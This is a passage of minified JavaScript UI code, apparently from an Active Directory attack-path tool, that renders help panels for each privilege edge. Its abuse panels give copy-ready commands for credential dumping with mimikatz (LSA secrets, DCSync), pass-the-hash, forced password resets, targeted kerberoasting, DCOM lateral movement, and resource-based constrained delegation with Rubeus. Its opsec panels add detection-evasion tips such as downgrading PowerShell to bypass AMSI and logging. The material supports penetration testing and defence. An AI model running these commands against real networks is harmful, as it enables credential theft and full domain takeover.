print(nt_hash)`}),e.jsx(t,{variant:"body2",children:"Execute it like so:"}),e.jsx(t,{component:"pre",children:"python3 nt.py 35f3e1713d61..."}),e.jsx(t,{variant:"body2",children:"To authenticate as the sMSA, leverage pass-the-hash."}),e.jsxs(t,{variant:"body2",children:["Alternatively, to avoid executing mimikatz on ",n,", you can save a copy of the"," ",e.jsx(t,{component:"pre",children:"SYSTEM"})," and"," ",e.jsx(t,{component:"pre",children:"SECURITY"})," registry hives from an elevated prompt:"]}),e.jsx(t,{component:"pre",children:"reg save HKLM\\SYSTEM %temp%\\SYSTEM & reg save HKLM\\SECURITY %temp%\\SECURITY"}),e.jsxs(t,{variant:"body2",children:["Transfer the files named ",e.jsx(t,{component:"pre",children:"SYSTEM"})," and"," ",e.jsx(t,{component:"pre",children:"SECURITY"})," that were saved at"," ",e.jsx(t,{component:"pre",children:"%temp%"})," to another computer where mimikatz can be safely executed. On this other computer, run mimikatz from a command prompt then execute the following command to obtain the hex-encoded password:"]}),e.jsx(t,{component:"pre",children:"lsadump::secrets /system:C:\\path\\to\\file\\SYSTEM /security:C:\\path\\to\\file\\SECURITY"})]}),Vi=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"Access to registry hives can be monitored and alerted via event ID 4656 (A handle to an object was requested)."})}),Ki=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://simondotsh.com/infosec/2022/12/12/assessing-smsa.html",children:"https://simondotsh.com/infosec/2022/12/12/assessing-smsa.html"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets",children:"https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/gentilkiwi/mimikatz",children:"https://github.com/gentilkiwi/mimikatz"})]}),Hi={general:Bi,abuse:Ni,opsec:Vi,references:Ki},qi=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," membership in the Distributed COM Users local group on the computer ",a,"."]}),e.jsx(t,{variant:"body2",children:"This can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods."})]}),Yi=({targetName:n})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The PowerShell script Invoke-DCOM implements lateral movement using a variety of different COM objects (ProgIds: MMC20.Application, ShellWindows, ShellBrowserWindow, ShellBrowserWindow, and ExcelDDE). LethalHTA implements lateral movement using the HTA COM object (ProgId: htafile)."}),e.jsx(t,{variant:"body2",children:"One can manually instantiate and manipulate COM objects on a remote machine using the following PowerShell code. If specifying a COM object by its CLSID:"}),e.jsx(t,{component:"pre",children:`$ComputerName = ${n}  # Remote computer
$clsid = "{fbae34e8-bf95-4da8-bf98-6c6e580aa348}"      # GUID of the COM object
$Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)`}),e.jsx(t,{variant:"body2",children:"If specifying a COM object by its ProgID:"}),e.jsx(t,{component:"pre",children:`$ComputerName = ${n}  # Remote computer
$ProgId = "<NAME>"      # GUID of the COM object
$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)`})]}),Ji=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The artifacts generated when using DCOM vary depending on the specific COM object used."}),e.jsx(t,{variant:"body2",children:"DCOM is built on top of the TCP/IP RPC protocol (TCP ports 135 + high ephemeral ports) and may leverage several different RPC interface UUIDs(outlined here). In order to use DCOM, one must be authenticated. Consequently, logon events and authentication-specific logs(Kerberos, NTLM, etc.) will be generated when using DCOM."}),e.jsx(t,{variant:"body2",children:"Processes may be spawned as the user authenticating to the remote system, as a user already logged into the system, or may take advantage of an already spawned process."}),e.jsxs(t,{variant:"body2",children:['Many DCOM servers spawn under the process "svchost.exe -k DcomLaunch" and typically have a command line containing the string " -Embedding" or are executing inside of the DLL hosting process "DllHost.exe /Processid:',"{<AppId>}",'" (where AppId is the AppId the COM object is registered to use). Certain COM services are implemented as service executables; consequently, service-related event logs may be generated.']})]}),Xi=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",children:"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/",children:"https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/",children:"https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/",children:"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom ",children:"https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.cybereason.com/blog/dcom-lateral-movement-techniques",children:"https://www.cybereason.com/blog/dcom-lateral-movement-techniques"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/",children:"https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Technique/T1175",children:"https://attack.mitre.org/wiki/Technique/T1175"}),e.jsx(t,{variant:"body1",children:"Invoke-DCOM"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1",children:"https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1"}),e.jsx(t,{variant:"body1",children:"LethalHTA"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://codewhitesec.blogspot.com/2018/07/lethalhta.html",children:"https://codewhitesec.blogspot.com/2018/07/lethalhta.html"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/codewhitesec/LethalHTA/ ",children:"https://github.com/codewhitesec/LethalHTA/"})]}),Qi={general:qi,abuse:Yi,opsec:Ji,references:Xi},Zi=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(t,{variant:"body2",children:[k(r,n)," the capability to change the ",I(s)," ",a,"'s password without knowing that user's current password."]}),ec=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."})]}),tc=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",e.jsx(t,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."})]}),nc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Executing this abuse with the net binary will necessarily require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),e.jsx(t,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4724 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for users that are obviously very high privilege groups (i.e.: Domain Admin users). Also be mindful that PowerShell v5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity. You may be able to completely evade those features by downgrading to PowerShell v2."}),e.jsx(t,{variant:"body2",children:"Finally, by changing a service account password, you may cause that service to stop functioning properly. This can be bad not only from an opsec perspective, but also a client management perspective. Be careful!"})]}),rc=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.sixdub.net/?p=579",children:"https://www.sixdub.net/?p=579"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"})]}),oc={general:Zi,windowsAbuse:ec,linuxAbuse:tc,opsec:nc,references:rc},ac=({sourceName:n,targetName:r,targetType:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The GPO ",n," is linked to the ",I(a)," ",r,"."]}),e.jsx(t,{variant:"body2",children:"A linked GPO applies its settings to objects in the linked container."})]}),sc=()=>e.jsx(t,{variant:"body2",children:"There is no abuse info related to this edge."}),ic=()=>e.jsx(t,{variant:"body2",children:"There are no opsec considerations related to this edge."}),cc=()=>e.jsxs(e.Fragment,{children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://wald0.com/?p=179",children:"https://wald0.com/?p=179"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.cptjesus.com/posts/bloodhound15",children:"https://blog.cptjesus.com/posts/bloodhound15"})]}),dc={general:ac,abuse:sc,opsec:ic,references:cc},lc=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," GenericAll privileges to the ",I(s)," ",a,"."]}),e.jsx(t,{variant:"body2",children:"This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish."})]}),hc=({sourceName:n,sourceType:r,targetName:a,targetType:s,targetId:i,haslaps:c})=>{switch(s){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Full control of a group allows you to directly modify group membership of the group."}),e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Full control of a user allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one."}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"}),e.jsx(t,{variant:"body1",children:" Force Change Password "}),e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."})]});case"Computer":return c?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Full control of a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object's security descriptor."}),e.jsx(t,{variant:"body2",children:"Alternatively, Full control of a computer object can be used to perform a resource based constrained delegation attack."}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Full control of a computer object can be used to perform a resource based constrained delegation attack."}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Full control of a domain object grants you both DS-Replication-Get-Changes as well as DS-Replication-Get-Changes-All rights. The combination of these rights allows you to perform the dcsync attack using mimikatz. To grab the credential of the user harmj0y using these rights:"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:harmj0y"})]});case"GPO":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."})});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organization Unit"}),e.jsx(t,{variant:"body2",children:"With full control of the OU, you may add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),e.jsxs(t,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",a," is: ",i,"."]}),e.jsx(t,{variant:"body2",children:"Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':"}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),e.jsx(t,{component:"pre",children:`$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`})]});default:return e.jsx(e.Fragment,{})}},pc=({sourceName:n,sourceType:r,targetName:a,targetType:s,targetId:i,haslaps:c})=>{switch(s){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Full control of a group allows you to directly modify group membership of the group."}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replaced with"," ",e.jsx(t,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Full control of a user allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one."}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),e.jsx(t,{variant:"body1",children:" Force Change Password "}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",e.jsx(t,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL 